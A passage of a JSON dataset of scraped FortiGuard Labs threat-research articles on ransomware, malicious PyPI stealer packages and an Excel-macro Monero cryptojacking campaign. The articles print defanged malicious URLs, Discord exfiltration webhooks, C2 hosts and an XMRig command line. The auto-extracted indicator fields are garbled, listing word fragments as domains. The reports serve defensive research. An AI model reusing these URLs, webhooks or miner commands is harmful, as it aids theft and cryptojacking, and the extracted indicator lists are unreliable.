malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). If you think this or any other cybersecurity threat has impacted you, contact ourGlobal FortiGuard Incident Response Team. FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and our FortiGuard AI-powered securityservices portfolio. Ransomware Roundup,ransomware,FortiGuards Labs FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-catb-ransomware",
      "scraped_at": "2025-07-20T14:00:25.471417",
      "indicators": {
        "ip_address": [],
        "domain": [
          "undll32",
          "ci"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "9990388776daa57d2b06488f9e2209e35ef738fd0be1253be4c22a3ab7c3e1e2",
          "35a273df61f4506cdb286ecc40415efaa5797379b16d44c240e3ca44714f945b",
          "c8e0aa3b859ac505c2811eaa7e2004d6e3b351d004739e2a00a7a96f3d12430c",
          "83129ed45151a706dff8f4e7a3b0736557f7284769016c2fb00018d0d3932cfa",
          "512587a73cd03c6324ade468689510472c6b9e54074f3cf115aa54393b14f037",
          "3661ff2a050ad47fdc451aed18b88444646bb3eb6387b07f4e47d0306aac6642"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.4383358098068351
    }
  },
  {
    "id": "Fortinet_1206",
    "source": "Fortinet",
    "title": "Supply Chain Attack via New Malicious Python Packages by Malware Author Core1337",
    "text": "FortiGuard Labs Threat Research The FortiGuard Labs team recently discovered several new 0-day attacks in the PyPI packages (Python Package Index) by malware author ‘Core1337’, who published the following packages: ‘3m-promo-gen-api’, ‘Ai-Solver-gen’, ‘hypixel-coins’, ‘httpxrequesterv2’, and ‘httpxrequester’. These attacks were published between January 27 to January 29, 2023. Each package had one version and an empty description, and all contained similar malicious code. For brevity, this blog will examine the ‘3m-promo-gen-api’ package as representative of the entire set. The first thing we notice in its setup.py is what looks like a webhook URL: hxxps://discord[.]com/api/webhooks/1069214746395562004/sejnJnNA3lWgkWC4V86RaFzaiUQ3dIAG958qwAUkLCkYjJ7scZhoa-KkRgBOhQw8Ecqd Each package includes similar code in their setup.py except for the webhook URL. Examining the URL shows it may be related to a “Spidey Bot” malware known to steal personal information through Discord, as seen in our previous blog about the packageweb3-essential. When we perform a static analysis by looking through its setup.py script, we spot several potential malicious behaviors, described below. Note that all the figures are from setup.py. Looking at the primary function, we get a general idea of malware behavior that may try to retrieve sensitive information from different browsers and Discord and save it to a file for exfiltration. Let’s look at the ‘getPassw’ function, for example. Below, it attempts to gather user and password information from the browsers listed in Figure 6 and then save it to a text file. The list of websites in Figure 8 may be used for retrieving the information mentioned earlier. We also see that the malware names itself ‘Fade Stealer,’ which can be seen when it writes its name at the top of its text file. Similar behavior is found in its ‘getCookie’ function. Looking at the ‘upload’ function, we can see clear clues about what it may do, such as using the webhook URL to steal files and data, as discussed above. From the functions ‘Kiwi’, ‘KiwiFile’, and ‘uploadToAnonfiles’, we can safely assume that it looks through specific folders and picks up specific file names for file transfer through the file-sharing site ‘https://transfer.sh/’. Many of these keywords are related to logins, accounts, banks, etc. In this blog, a single malware author published several packages with entirely different names but with similar codes designed to launch attacks. The malware authors can executemalicious attackswith a single python script, such as stealing sensitive information using webhooks on Discord. FortiGuard Labs notified Python Package Index administrators about this malicious package, and they have confirmed that it has been taken down. FortiGuard AntiVirus detects the malicious scripts identified in this report as setup.py:Python/Agent. DC4D!tr.pws The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them. If you think this or any other cybersecurity threat has impacted you, contact ourGlobal FortiGuard Incident Response Team. Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. 915b75ea258a42c5c1916d18a42302bbafa960bdafea1588b772d5284eec1997 Malicious URLs hxxps://discord[.]com/api/webhooks/1069214746395562004/sejnJnNA3lWgkWC4V86RaFzaiUQ3dIAG958qwAUkLCkYjJ7scZhoa-KkRgBOhQw8Ecqd threat research,python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/supply-chain-attack-via-new-malicious-python-packages-by-malware-author-core1337",
      "scraped_at": "2025-07-20T14:00:32.780125",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ransfer",
          "etup",
          "r"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "915b75ea258a42c5c1916d18a42302bbafa960bdafea1588b772d5284eec1997"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://transfer.sh/"
        ]
      },
      "threat_score": 0.3846153846153846
    }
  },
  {
    "id": "Fortinet_82079",
    "source": "Fortinet",
    "title": "Supply Chain Attack by New Malicious Python Package, “web3-essential”",
    "text": "FortiGuard Labs Threat Research The FortiGuard Labs team has discovered another new 0-day attack in a PyPI package (Python Package Index) called “web3-essential”. It was discovered on January 30, 2023, by monitoring an open-source ecosystem. The package was published on January 26, 2023, the same day as its author, ‘Trexon’, joined the repository. Given the frequency of this pattern of simultaneously joining and publishing, it may be a wise idea to take precautions for downloading packages published by newly joined authors. The author included a brief description of the project along with a unique version number of ‘1.0.4b0’ as if to try and avoid suspicion. The package includes malicious code in its setup.py installation script that downloads and runs an executable file as a part of its installation. The interesting element is the URL, which requires deeper analysis: hxxps://cdn[.]discordapp[.]com/attachments/1068100530498449468/1068239485613125702/ily[.]exe As shown in the VirusTotal entry below, the download URL includes the following binary exe (SHA 256): 43c89b9263f78ef870bf205e92f7912c8b2845d33391b46cd747d45a5632aea0. While this download URL is only detected by one vendor, a few vendors do flag the downloaded executable file as malicious. The downloaded executable seems to be a Go-compiled executable file. Let’s try running it. One suspicious behavior conducted by ‘ily.exe’ is that it creates DB files in the ‘%USER%\\AppData\\Local\\cloudflare-warp-cache\\raw\\’ folder. This may be used for recording sensitive user data and credentials. Let’s take a look at the DB files below. We can safely assume they will be used for saving sensitive data and credentials, such as credit card and log-in information. When we take a look inside the binary using IDA, we see many strings that raise suspicions. We can also get some clues about the malware behavior by observing these. Some keywords of interest include, ‘virus’, ‘wallets’, ‘browsers’, ‘login’, and ‘passwords’. Below we can also see some strings with ‘.zip’ for several browser names which could be indication of saving the sensitive information as a zip file. The examples in the code shown below are of the browsers that the malware takes an interest in. We also found an interesting URL embedded in the code: hxxps://discordapp[.]com/api/webhooks/1068100542682902558/9JUsLnJZLyEkc_bGS85KTa5M1VWZ2J496v6Ruo7oUclFE08osfXNZL_OK5YDGOPYHLFy It uses a Go package, ‘dishooks’, which is a Discord webhook API wrapper. Within the URL, we see that it may be related to a “Spidey Bot” malware which is known to steal personal information through Discord. In this blog, we saw a new author upload a malicious package on the same day as they joined. This package included a very simple python script that leads to downloading a malicious binary executable designed to steal sensitive information like credit cards and logins. In our previous blogs looking at malicious PyPI packages, we have observed that malware authors commonly behave in this way. We have also learned that these malicious executable are also frequently compiled using a variety of compilers, such as Go-compiler or PyInstaller, etc. Python Package Index administrators have confirmed that after notification by FortiGuard Labs, this package has been taken down. FortiGuard AntiVirus detects the malicious executables identified in this report as ily.exe:W64/Stealer.679E!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them. If you think you’ve been impacted by this or any other cybersecurity threat, reach out to ourGlobal FortiGuard Incident Response Team. 43c89b9263f78ef870bf205e92f7912c8b2845d33391b46cd747d45a5632aea0 Malicious URLs hxxps://cdn[.]discordapp[.]com/attachments/1068100530498449468/1068239485613125702/ily[.]exe Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. 0-day,threat research,python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/supply-chain-attack-by-new-malicious-python-package-web3-essential",
      "scraped_at": "2025-07-20T14:00:41.470650",
      "indicators": {
        "ip_address": [],
        "domain": [
          "etup",
          "ly"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "43c89b9263f78ef870bf205e92f7912c8b2845d33391b46cd747d45a5632aea0"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.18363939899833057
    }
  },
  {
    "id": "Fortinet_83244",
    "source": "Fortinet",
    "title": "Ransomware Roundup – Trigona",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Trigona ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High The Trigona ransomware variant was first reported in October 2022. Trigona has adopted the double-extortion methodology of encrypting endpoints and/or other infrastructure of value within an organization and then threatening to release exfiltrated data from those machines on the internet if a ransom is not paid. As proof that users can get affected files back, the Trigona threat actor offers free decryption of up to three files. Some public reports suggest Trigona ransomware activity picked up towards the end of 2022. While the infection vector has not been identified, deployment via other malware distributed using emails, Remote Desktop Protocol (RDP), and exploiting vulnerabilities are suspected distribution methods. When launched, the ransomware encrypts files on compromised machines and adds a “._locked” file extension to those encrypted files. It also leaves a “how_to_decrypt.hta” file, shown below. This is an HTML file that contains details on how to recover encrypted data as well as how to contact the Trigona ransomware threat actor. While a download link for the Tor browser is available in the ransom note, it no longer worked at the time of the investigation. As such, users are expected to find and visit the official Tor site to download and install the Tor browser. Once a link to the decryption page is copied and opened on the Tor browser, Trigona ransomware victims are presented with a sign-up page where they can enter a key left in the ransom note. In the next screen, victims are asked to enter a username and set a login password. Some variants of Trigona ransomware do not direct victims to the Tor site. Instead, the ransom note asks victims to email the attacker. Publicly available reports indicate that victims are asked to buy and pay an unknown amount of ransom in Monero (XMR) cryptocurrency after logging into the Tor site. The Tor site also offers a victim support chat option. Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Trigona ransomware variants with the following AV signature: File-based IOCs: 248e7d2463bbfee6e3141b7e55fa87d73eba50a7daa25bed40a03ee82e93d7db 596cf4cc2bbe87d5f19cca11561a93785b6f0e8fa51989bf7db7619582f25864 704f1655ce9127d7aab6d82660b48a127b5f00cadd7282acb03c440f21dae5e2 859e62c87826a759dbff2594927ead2b5fd23031b37b53233062f68549222311 8f8d01131ef7a66fd220dc91388e3c21988d975d54b6e69befd06ad7de9f6079 97c79199c2f3f2edf2fdc8c59c8770e1cb8726e7e441da2c4162470a710b35f5 a86ed15ca8d1da51ca14e55d12b4965fb352b80e75d064df9413954f4e1be0a7 accd5bcf57e8f9ef803079396f525955d2cfffbf5fe8279f744ee17a7c7b9aac da32b322268455757a4ef22bdeb009c58eaca9717113f1597675c50e6a36960a e7c9ec3048d3ea5b16dce31ec01fd0f1a965f5ae1cbc1276d35e224831d307fc e97de28072dd10cde0e778604762aa26ebcb4cef505000d95b4fb95872ad741b f29b948905449f330d2e5070d767d0dac4837d0b566eee28282dc78749083684 fa6f869798d289ee7b70d00a649145b01a93f425257c05394663ff48c7877b0d fbba6f4fd457dec3e85be2a628e31378dc8d395ae8a927b2dde40880701879f2 fd25d5aca273485dec73260bdee67e5ff876eaa687b157250dfa792892f6a1b6 Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. threat research,ransomware,Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-trigona-ransomware",
      "scraped_at": "2025-07-20T14:00:49.882507",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "fa6f869798d289ee7b70d00a649145b01a93f425257c05394663ff48c7877b0d",
          "97c79199c2f3f2edf2fdc8c59c8770e1cb8726e7e441da2c4162470a710b35f5",
          "da32b322268455757a4ef22bdeb009c58eaca9717113f1597675c50e6a36960a",
          "8f8d01131ef7a66fd220dc91388e3c21988d975d54b6e69befd06ad7de9f6079",
          "a86ed15ca8d1da51ca14e55d12b4965fb352b80e75d064df9413954f4e1be0a7",
          "accd5bcf57e8f9ef803079396f525955d2cfffbf5fe8279f744ee17a7c7b9aac",
          "fd25d5aca273485dec73260bdee67e5ff876eaa687b157250dfa792892f6a1b6",
          "e7c9ec3048d3ea5b16dce31ec01fd0f1a965f5ae1cbc1276d35e224831d307fc",
          "248e7d2463bbfee6e3141b7e55fa87d73eba50a7daa25bed40a03ee82e93d7db",
          "f29b948905449f330d2e5070d767d0dac4837d0b566eee28282dc78749083684",
          "596cf4cc2bbe87d5f19cca11561a93785b6f0e8fa51989bf7db7619582f25864",
          "fbba6f4fd457dec3e85be2a628e31378dc8d395ae8a927b2dde40880701879f2",
          "704f1655ce9127d7aab6d82660b48a127b5f00cadd7282acb03c440f21dae5e2",
          "e97de28072dd10cde0e778604762aa26ebcb4cef505000d95b4fb95872ad741b",
          "859e62c87826a759dbff2594927ead2b5fd23031b37b53233062f68549222311"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.7700770077007701
    }
  },
  {
    "id": "Fortinet_74921",
    "source": "Fortinet",
    "title": "Analyzing Malware Code that Cryptojacks System to Mine for Monero Crypto",
    "text": "FortiGuard Labs Threat Research FortiGuard Labs recently captured Excel documents in the Microsoft OLE Compound File format that contain malicious VBA Macros. Their file names are Pago_detalles.xls, makbuzu.xls, and Pago.xls. I then conducted deep research on them and found that they all belong to the same malicious campaign that cryptojacks systems to mine for Monero (XMR) cryptocurrency. Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Cryptojack Victim’s Device to Mine CryptocurrencySeverity level:Critical In this analysis, I will show how the crypto miner software is delivered by opening the Excel document and how it is executed on a victim’s device. I also look at the techniques it uses to prevent its code from being analyzed, how it gains persistence on the victim’s device, and how the malware performs process hollowing to execute the Monero miner on the victim’s device. The content and VBA project are similar in all three Excel documents. When the document is opened in Microsoft Excel, as shown in Figure 1.1, it pops up a yellow warning bar to alert the user that the document contains a risky Macro project, which will be executed once the “Enable Content” button is clicked. Given that the content is written in Spanish, this campaign targets Spanish-speaking people. It shows a blurred picture of a statement that tricks the user into clicking the button on the yellow bar for a clearer view. The VBA Macro project is password protected from viewing, editing, and debugging. Once I disarmed its protections, I found an auto-execution sub-procedure Workbook_Open() in the project that is executed automatically once the Excel document is opened. After deobfuscating the VBA statements, it is easy to understand the purpose of the sub-procedure Workbook_Open(), as shown in Figure 1.2. It downloads a file from hxxps[:]//www[.]tractorandinas[.]com/wocontent/templates.exe, saves it into the system’s Templates folder, and renames it “GHJFRGUNL.exe”. At the end of the Workbook_Open() auto-run procedure, it calls “FPKGNSJJDW_Shell_Application. Open (VMNXMOV_local_file)” to run the downloaded file on the victim’s device. The downloaded file “GHJFRGUNL.exe” was developed using Microsoft . Net Framework and is protected by an obfuscator called “ConfuserEx v1.0.0”. By deobfuscating the file, I located a . Net Exe file, which is easier for analysts to use to comprehend its work-flows. It contains a . Net resource, which can be obtained with its resource name “Fyyxdkrpjokzonmmc” by calling the API ResourceManager. GetObject(). Figure 2.1 is a screenshot of the deobfuscated Exe file in an analysis tool. The . Net resource is shown on the right. The resource's data is a GZip-compressed . Net module (DLL) file. It is extracted in memory and then loaded. Figure 2.2 shows the context code of doing that. Next, it gets the type of the entry point function for the . Net module and calls it by calling the API Type. InvokeMember(). The function is named \"YLbTOcLUZT\" and is defined under the namespace.class “DKNYEHTGFSSZDfys0h6.dOICUYTjc8hIf6usABv”. Figure 2.3 shows the dynamically loaded . Net module in a . Net debugger, where it breaks at the entry point function. As you may have noticed, the module is thoroughly obfuscated, including the class name, variable names, obfuscated workflow, and more. It also includes functions to perform anti-tamper checks during the run time. These cause the system to crash if it detects any modifications made to the module. That means that it’s hard to deobfuscate. This was my biggest challenge in analyzing it. According to my analysis, the downloaded file is like a malware loader and installer, and the . Net module is the payload module for the malware. The payload module determines if the current process file (“GHJFRGUNL.exe”) is located in the system “%AppData%” folder and runs with Administrator privilege. If not, it will exit the process and rerun it with Administrator privilege, popping up a message for the victim to confirm. It copies the Exe file into the “%AppData%” folder and adds it to the system Task Scheduler. This ensures the process launches at startup and runs every two minutes. It breaks at a function, as shown in Figure 3.1, where it uses a TaskScheduler object to create the new task with the TaskDefinition displayed at the bottom. The new task’s name is from the process name “GHJFRGUNL”. Figure 3.2 is the screenshot of the system Task Scheduler. You can see that a new task has been created with the process name. Once completed, it can launch at system startup. The Task Scheduler repeatedly starts “GHJFRGUNL.exe” every two minutes in case the process or its sub-processes are killed by the victim due to high consumption of hardware resources (like CPU and memory). It also has a strategy for keeping only one process running simultaneously using a Mutex object. Its config block data is base64 encoded in the payload module (“Fyyxdkrpjokzonmmc.dll”), which is decoded and loaded in a config block. This contains the malware configuration data, like flags that tell the malware how to work, its C2 server domain string and port numbers, malware variant name, and crypto key used to encrypt and decrypt packets between the client and C2 server. The decoded config block data is a stream of bytes converted into an object by calling the Deserialize()function(from a third-party module, protobuf-net.dll). The config object is used throughout the payload module lifetime. Figure 4.1 is a screenshot of the config data being deserialized into a global variable. There are two TCP port numbers in the config object. It repeatedly attempts to connect to the C2 server with two ports, one by one, until a connection is established. Next, it gathers basic information from the victim’s device, encrypts the collected information, and sends it to its C2 server. Figure 4.2 shows when the malware is about to call a function to encrypt the collected information carried by variable “u” and send it to the C2 server. The collected information consists of many of the items shown below: It uses a Triple DES cipher algorithm to encrypt and decrypt the data between the malware and its C2 server. Figure 4.3 shows the encrypted packets captured by Wireshark. The cryptography key is \"57dd8b6cc78fd8f51c2f5a\", taken from the config object. Steps for sending data to the C2 server Steps for receiving data from the C2 server Figure 4.4 shows the entire set of received data responding to the first packet with collected information to the C2 server. It has been converted into an object variable (referred to as a response object) from a byte stream. The response object leads the malware to execute further unauthorized actions on the victim’s device. In the response object, there are two Onedriver URLs from which the malware will download two files. The two MD5 values in the response object are the hash values of the two files. It does not save the files to local folders but to the system registry under its sub-key, as shown in Figure 4.5. The sub-key name “96f709c1c080fbcb92806bd724266a03” is the victim ID, as I mentioned earlier. It is generated with the device hardware information. The names of the values are the two files’ MD5 values, and the data is the content of the two files. It won’t download the two files if the relevant registry values exist. Both of them are compressed PE files, which are named “plugin_3.dll” (File size: 2.3Mb, MD5:78B10BAE1DB822E486A2393F0ADBE627) and “plugin_4.dll” (File size: 37Kb, MD5: A722D3BCD1D9056D1BBE840197059BCE) on the website. To explain how they work together, I will refer to them by their names. Decompressing “plugin_4.dll” gets a . Net dll file (“ClassLibrary1.dll”), which is used to perform process hollowing. “plugin_3.dll” contains an Exe file (“xmrig.exe”, the XMR Miner) that will be injected into another process by “plugin_4.dll”. The payload module (“Fyyxdkrpjokzonmmc”) proceeds to dynamically load “ClassLibrary1.dll”, which is also thoroughly obfuscated. Its function, Plugin. Plugin. Run(), is the entry point function for process hollowing. After “xmrig.exe” is decompressed in memory, as shown in Figure 5.1, it calls the API CreateProcess() to create a process called \"AddInProcess.exe\", which is from the response object (refer to Figure 4.4). The function parameter Creation Flag is 12 (i.e.,CREATE_SUSPENDED | DETACHED_PROCESS). Later, it calls a bunch of key Windows APIs, such as VirtualAlloc(), GetThreadContext(), WriteProcessMemory(), SetThreadContext(), and ResumeThread(), to deploy the “xmrig.exe” into the newly-created “AddInProcess.exe” process. Afterward, “xmrig.exe” runs as “AddInProcess.exe”, and the malware payload module becomes the daemon process to the process-hollowed process to prevent it from being killed. XMRig is a high-performance, open-source, cross-platform (Windows, Linux, Android, and macOS) cryptocurrency miner application, which is both a CPU and GPU miner supporting RandomX, KawPow, CryptoNight, and GhostRider algorithms. However, this platform is also commonly abused by cybercriminals to perform cryptojacking, which means hackers hijack the victim’s computing resources to mine cryptocurrencies on their behalf. “xmrig.exe” is XMrig’s Windows version application. It can use the CPU to mine for Monero coins. I manually decompressed the miner application from the downloaded “plugin_3.dll” into “plugin_3_1.exe”. You can see the detailed properties of this file in Figure 6.1. Taking a look back at the Process Hollowing section, it created a suspended new process of “AddInProcess.exe”. Other than the Creation Flag to API CreateProcess(), it also has a Command Line parameter, like “C:\\Windows\\Microsoft. NET\\Framework64\\v4.0.30319\\AddInProcess.exe -o xmr.2miners.com:13333 -u 88hKxLYFGsx4U{…}eF. Rig998 -p x --tls --algo rx/0 --cpu-max-threads-hint=50\". The parameter string is from the response object (refer to Figure 4.4). It is not a parameter to the created “AddInProcess.exe” but for the xmrig.exe that has been injected into it. The following table contains a description for each of the options: -o, --url=URL It specifies the mining server and port. -a, --algo=ALGO It specifies mining algorithm to be used. -u, --user=USERNAME It is the hacker’s wallet address. -p, --pass=PASSWORD It is the password for mining server. It enables SSL/TLS support. --cpu-max-threads-hint=N It specifies the maximum CPU threads count (in percentage) hint for autoconfig Figure 6.2 shows how XMRig is mining Monero for the attacker. In this analysis, we walked through the entire process, from executing the VBA code in the Excel document to downloading an executable file (template.exe or GHJFRGUNL.exe). Next, I explained how the payload . Net module is extracted from the executable file and executed. Then, you learned how the malware communicates with its C2 server and what control data (Monero miner) is received. Last, I elaborated on how it injects a Monero miner into another process (“AddInProcess.exe”) by executing process hollowing to mine Monero on the attacker’s behalf. Below is a workflow chart that depicts the entire process. Fortinet customers are already protected from this campaign with FortiGuard’s Web Filtering, and AntiVirus services as follows: The downloading URLs and C2 server are rated as “Malicious Websites” by the FortiGuard Web Filtering service. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious VBA project inside the Excel document. The relevant samples are covered and blocked by the FortiGuard Antivirus service. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The Fortinet AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. hxxps://www[.]tractorandinas[.]com/wocontent/templates[.]exe hxxps://onedrive[.]live[.]com/download?cid=F32323276F5346E9&resid=F32323276F5346E9%21132&authkey=AJUNOnV3DDTyOJw hxxps://onedrive[.]live[.]com/download?cid=F32323276F5346E9&resid=F32323276F5346E9%21131&authkey=ANCBF29YwxfXxd4 C2 Server List: dnuocc[.]com:9077 dnuocc[.]com:9078 Relevant Sample SHA-256 EF02701E2196F54B5858BCB67A41D34FC9A5F248EFDAE181C701C200950D638D [makbuzu.xls] 68346D23F359A27744B49D6EA9BD229F2929D1CEE057670D2BA73545C0BA427D [Pago_detalles.xls] 417AE2D5F5111DDF80B63C443E14B70EC2052B3E64A35940C9F81F262F7E526E [templates.exe / GHJFRGUNL.exe] 8A2194A75F972890729328A15A01B34E327A0145A6121098315AF9ECBF86ED67 Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio. Sign upto receive our threat research blogs. threat research,crypto,vba,excel,FortiGuards Labs FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/malicious-code-cryptojacks-device-to-mine-for-monero-crypto",
      "scraped_at": "2025-07-20T14:00:58.640579",
      "indicators": {
        "ip_address": [],
        "domain": [
          "miners",
          "akbuzu",
          "amespace",
          "ddInProcess",
          "lassLibrary1",
          "rotobuf-net",
          "emplate",
          "mrig",
          "emplates",
          "ago",
          "HJFRGUNL",
          "yyxdkrpjokzonmmc"
        ],
        "hash_md5": [
          "78B10BAE1DB822E486A2393F0ADBE627",
          "A722D3BCD1D9056D1BBE840197059BCE",
          "96f709c1c080fbcb92806bd724266a03"
        ],
        "hash_sha1": [],
        "hash_sha256": [
          "EF02701E2196F54B5858BCB67A41D34FC9A5F248EFDAE181C701C200950D638D",
          "68346D23F359A27744B49D6EA9BD229F2929D1CEE057670D2BA73545C0BA427D",
          "8A2194A75F972890729328A15A01B34E327A0145A6121098315AF9ECBF86ED67",
          "417AE2D5F5111DDF80B63C443E14B70EC2052B3E64A35940C9F81F262F7E526E"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.3068122724908997
    }
  },
  {
    "id": "Fortinet_19160",
    "source": "Fortinet",
    "title": "FortiGuard Outbreak Alerts - 2022 Annual Report",
    "text": "FortiGuard Labs Threat Research Outbreaks have been a continued and critical element of 2022—no, not that type of outbreak. We’re talking about FortiGuard Outbreak Alerts. During the SolarWinds Orion supply chain attack at the end of 2020, a number of our customers asked us to help them determine whether their Fortinet solutions had protected them against its multiple attack vectors, malware, resulting lateral movement, and command and control activity. While all of this information existed, we wanted to make it more readily available for customers. So, to help our customers more rapidly determine whether they had been protected against an attack and to better enable rapid threat hunting to identify Indicators of Compromise (IoCs) across their network, we developed theFortiGuard Outbreak Alertsand correspondingFortiGuard Outbreak Detection Service. In the years since, we have enhanced this service to include the following: These enhancements enable customers to react quickly to emerging outbreaks with factual, actionable intelligence. In 2022, FortiGuard IPS and FortiGuard AV/Sandbox blocked three trillion and six trillion hits, respectively, from vulnerabilities, malware, and 0-day attacks. Those hits encompassed several thousand varieties of remote code lifecycle components, including attack execution,cross-site scripting(XSS), the elevation of privilege, denial of service (DoS and DDoS), Trojans, and other exploits. FortiGuard Labs also alerted customers to numerous critical threats throughout the year based on factors such as proof-of-concept, attack vectors, impact, ease of attack, dependencies, and more. This annual report covers: Followthis linkto the full 2022 Outbreak Alert Report. Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s AI-powered Security Servicesportfolio. Sign upto receive our threat research blogs. FortiGuards Labs,framework FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/fortiguard-outbreak-alerts-2022-annual-report",
      "scraped_at": "2025-07-20T14:01:05.765476",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.38461538461538464
    }
  },
  {
    "id": "Fortinet_40522",
    "source": "Fortinet",
    "title": "The Year of the Wiper",
